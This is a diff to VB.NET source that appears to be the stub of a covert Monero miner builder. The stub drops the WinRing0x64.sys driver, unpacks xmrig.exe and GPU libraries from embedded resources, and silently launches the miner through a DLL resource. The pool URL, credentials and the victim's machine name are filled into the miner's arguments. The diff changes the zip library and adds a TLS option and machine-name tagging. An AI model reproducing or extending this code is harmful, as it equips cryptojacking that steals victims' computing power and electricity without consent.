@@ -11,13 +11,13 @@ Imports System.Collections.Generic
 Imports System.Drawing
 Imports System.Windows.Forms
 Imports System.IO
-Imports System.IO.Compression
 Imports System.Net
 Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 Imports System.Threading
 Imports System.Security
 Imports System.Text
+Imports Ionic.Zip
 
 #Const Assembly = False
 #Const INS = False
@@ -25,6 +25,7 @@ Imports System.Text
 #Const EnableGPU = False
 #Const EnableIdle = False
 #Const EnableNicehash = False
+#Const EnableSSLTLS = False
 
 #If Assembly Then
 <Assembly: AssemblyTitle("%Title%")>
@@ -114,34 +115,29 @@ Public Class Program
                 System.IO.Directory.CreateDirectory(baseDir)
                 My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)
 
-
-                Using archive As ZipArchive = New ZipArchive(New MemoryStream(xmr))
-                    For Each entry As ZipArchiveEntry In archive.Entries
-                        If entry.FullName.Contains("xmrig.exe") Then
-                            Using streamdata As Stream = entry.Open()
-                                Using ms = New MemoryStream()
-                                    streamdata.CopyTo(ms)
-                                    xmrminer = ms.ToArray
-                                End Using
+                Using zip As ZipFile = ZipFile.Read(New MemoryStream(xmr))
+                    Dim e As ZipEntry
+                    For Each e In zip
+                        If e.FileName.Contains("xmrig.exe") Then
+                            Using ms = New MemoryStream()
+                                e.Extract(ms)
+                                xmrminer = ms.ToArray
                             End Using
                         End If
                     Next
                 End Using
-
 
 #If EnableGPU Then
             Dim GPUstr as String = GetGPU
             If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                 Try
                     Dim libs As Byte() = GetTheResource("#libs")
-                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
-                        For Each entry As ZipArchiveEntry In archive.Entries
-                            entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
-                        Next
+                    Using zip As ZipFile = ZipFile.Read(New MemoryStream(libs))
+                        zip.ExtractAll(baseDir, ExtractExistingFileAction.OverwriteSilently)
                     End Using
 
                     If GPUstr.ToLower.Contains("nvidia") Then
-                        runString += " --cuda --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote
+                        runString += " --cuda --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote
                     End If
 
                     If GPUstr.ToLower.Contains("amd") Then
@@ -169,9 +165,14 @@ Public Class Program
             runString += " --no-cpu "
 #End If
 
+#If EnableSSLTLS Then
+            runString += " --tls "
+#End If
+
             'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
-            Dim argstr As String = " -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU "
+            Dim argstr As String = " -B #AdvancedParams --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU "
             argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
+            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
             Run(GetTheResource("#dll"), argstr + runString, xmrminer)
         Catch ex As Exception
         End Try
